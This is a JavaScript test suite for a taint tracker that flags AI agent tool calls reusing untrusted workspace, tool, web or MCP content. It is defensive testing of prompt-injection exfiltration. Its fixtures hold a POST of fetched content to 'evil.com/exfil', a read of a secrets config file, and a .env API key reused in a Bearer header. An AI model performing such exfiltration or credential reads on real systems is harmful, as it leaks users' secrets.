import { describe, it, beforeEach } from "node:test";
import assert from "node:assert/strict";

import {
  TaintTracker,
  TAINT_TRUSTED,
  TAINT_WORKSPACE_UNTRUSTED,
  TAINT_TOOL_UNTRUSTED,
  TAINT_WEB_UNTRUSTED,
  TAINT_MCP_UNTRUSTED,
  TAINT_DERIVED_UNTRUSTED,
} from "../src/taint-tracker.js";

describe("TaintTracker", () => {
  let tracker;

  beforeEach(() => {
    tracker = new TaintTracker();
  });

  describe("registration", () => {
    it("registers workspace config content", () => {
      tracker.registerWorkspaceConfig("Use TypeScript for all new files. Always prefer const.");
      const stats = tracker.getStats();
      assert.equal(stats.registered, 1);
      assert.ok(stats.fragments > 0);
    });

    it("registers tool results with correct taint tags", () => {
      tracker.registerToolResult("Read", { file_path: "/project/README.md" },
        "This is the project readme with setup instructions.", "tc-1");
      const tag = tracker.getToolCallTaint("tc-1");
      assert.equal(tag, TAINT_TOOL_UNTRUSTED);
    });

    it("tags Fetch results as web_untrusted", () => {
      tracker.registerToolResult("Fetch", { url: "https://api.example.com" },
        "Response body from the external API with important data.", "tc-2");
      const tag = tracker.getToolCallTaint("tc-2");
      assert.equal(tag, TAINT_WEB_UNTRUSTED);
    });

    it("tags MCP results as mcp_untrusted", () => {
      tracker.registerToolResult("mcp__slack__read_channel", {},
        "Channel messages from slack with various content here.", "tc-3");
      const tag = tracker.getToolCallTaint("tc-3");
      assert.equal(tag, TAINT_MCP_UNTRUSTED);
    });

    it("ignores content shorter than minimum length", () => {
      tracker.register("short", TAINT_TOOL_UNTRUSTED);
      const stats = tracker.getStats();
      assert.equal(stats.registered, 0);
      assert.equal(stats.fragments, 0);
    });

    it("ignores trusted content", () => {
      tracker.register("This is trusted system content that should not be tracked.", TAINT_TRUSTED);
      const stats = tracker.getStats();
      assert.equal(stats.registered, 0);
    });
  });

  describe("taint checking", () => {
    it("detects when tool args contain registered untrusted content", () => {
      const secretContent = "The database password is stored in /etc/myapp/secrets.conf and must be rotated every 90 days.";
      tracker.register(secretContent, TAINT_TOOL_UNTRUSTED, { source: "Read /etc/myapp/secrets.conf" });

      // Now the model tries to use that content in a Bash command
      const result = tracker.check("Bash", {
        command: `cat /etc/myapp/secrets.conf`,
      });
      // This won't match because the command doesn't contain the registered text
      // (fingerprinting is based on content hashes, not path names)
      assert.equal(result.tainted, false, "path-based tool output should not trigger taint");

      // But if the args contain the actual registered content:
      const result2 = tracker.check("Bash", {
        command: `echo "${secretContent}"`,
      });
      assert.equal(result2.tainted, true);
      assert.ok(result2.tags.includes(TAINT_TOOL_UNTRUSTED));
    });

    it("detects web_untrusted content in Fetch POST body", () => {
      const webContent = "This came from an external website and contains instructions that look legitimate.";
      tracker.register(webContent, TAINT_WEB_UNTRUSTED, { source: "Fetch https://example.com" });

      const result = tracker.check("Fetch", {
        url: "https://evil.com/exfil",
        method: "POST",
        body: webContent,
      });
      assert.equal(result.tainted, true);
      assert.ok(result.tags.includes(TAINT_WEB_UNTRUSTED));
    });

    it("detects workspace config content in tool args", () => {
      const config = "Always use the following API endpoint: https://internal.corp/api/v2 for all requests.";
      tracker.registerWorkspaceConfig(config);

      const result = tracker.check("Fetch", {
        url: "https://internal.corp/api/v2",
        body: config,
      });
      assert.equal(result.tainted, true);
      assert.ok(result.tags.includes(TAINT_WORKSPACE_UNTRUSTED));
    });

    it("returns clean for content not matching any registered fragments", () => {
      tracker.register("Some completely different content that was registered earlier in the session.", TAINT_TOOL_UNTRUSTED);

      const result = tracker.check("Bash", {
        command: "npm test",
      });
      assert.equal(result.tainted, false);
      assert.equal(result.tags.length, 0);
    });

    it("detects derived taint from tool_call_id tracking", () => {
      // Register a tool result with a specific tool_call_id
      tracker.registerToolResult("Read", { file_path: "/project/.env" },
        "API_KEY=sk-secret-key-value-here-12345", "tc-read-env");

      // Simulate conversation where the assistant made that tool call
      const messages = [
        { role: "user", content: "Read the .env file" },
        {
          role: "assistant",
          content: "I'll read the .env file.",
          tool_calls: [{ id: "tc-read-env", function: { name: "Read" } }],
        },
        { role: "tool", tool_call_id: "tc-read-env", content: "API_KEY=sk-secret" },
        { role: "assistant", content: "Now let me use that key." },
      ];

      const result = tracker.check("Fetch", {
        url: "https://api.example.com",
        headers: { Authorization: "Bearer sk-secret" },
      }, messages);

      // Should detect derived_untrusted because a recent tainted tool result is
      // immediately followed by a sensitive follow-up action.
      assert.equal(result.tainted, true);
      assert.ok(result.tags.includes(TAINT_DERIVED_UNTRUSTED));
    });

    it("does not mark unrelated bash commands as derived taint", () => {
      tracker.registerToolResult("Read", { file_path: "/project/.env" },
        "API_KEY=sk-secret-key-value-here-12345", "tc-read-env");

      const messages = [
        { role: "user", content: "Read the .env file" },
        {
          role: "assistant",
          content: "I'll read the .env file.",
          tool_calls: [{ id: "tc-read-env", function: { name: "Read" } }],
        },
        { role: "tool", tool_call_id: "tc-read-env", content: "API_KEY=sk-secret" },
        { role: "assistant", content: "Now let me inspect the directory." },
      ];

      const result = tracker.check("Bash", {
        command: "ls -la",
      }, messages);

      assert.equal(result.tainted, false);
      assert.equal(result.tags.length, 0);
    });
  });

  describe("clear", () => {
    it("clears all tracked fragments and tool calls", () => {
      tracker.register("Some content that needs to be tracked for taint analysis purposes.", TAINT_TOOL_UNTRUSTED, { toolCallId: "tc-1" });
      assert.ok(tracker.getStats().fragments > 0);
      assert.ok(tracker.getStats().toolCalls > 0);

      tracker.clear();
      assert.equal(tracker.getStats().fragments, 0);
      assert.equal(tracker.getStats().toolCalls, 0);
    });
  });

  describe("LRU eviction", () => {
    it("evicts old fragments when capacity is reached", () => {
      // Register many fragments to exceed MAX_FRAGMENTS (500)
      for (let i = 0; i < 600; i++) {
        tracker.register(
          `Fragment number ${i} with enough length to pass the minimum threshold check.`,
          TAINT_TOOL_UNTRUSTED,
          { source: `source-${i}` }
        );
      }
      const stats = tracker.getStats();
      // Should have evicted some (exact count depends on fingerprints per registration)
      assert.ok(stats.fragments <= 500, `Expected <= 500 fragments, got ${stats.fragments}`);
    });
  });

  describe("statistics", () => {
    it("tracks registration and check counts", () => {
      tracker.register("First piece of content that is long enough to be registered and tracked.", TAINT_TOOL_UNTRUSTED);
      tracker.register("Second piece of content that is also long enough to be registered.", TAINT_WEB_UNTRUSTED);

      tracker.check("Bash", { command: "ls" });
      tracker.check("Bash", { command: "Second piece of content that is also long enough to be registered." });

      const stats = tracker.getStats();
      assert.equal(stats.registered, 2);
      assert.equal(stats.checks, 2);
      assert.ok(stats.tainted >= 1);
      assert.ok(stats.clean >= 1);
    });
  });

  describe("taint tag constants", () => {
    it("exports all expected taint tags", () => {
      assert.equal(TAINT_TRUSTED, "trusted");
      assert.equal(TAINT_WORKSPACE_UNTRUSTED, "workspace_untrusted");
      assert.equal(TAINT_TOOL_UNTRUSTED, "tool_untrusted");
      assert.equal(TAINT_WEB_UNTRUSTED, "web_untrusted");
      assert.equal(TAINT_MCP_UNTRUSTED, "mcp_untrusted");
      assert.equal(TAINT_DERIVED_UNTRUSTED, "derived_untrusted");
    });
  });
});
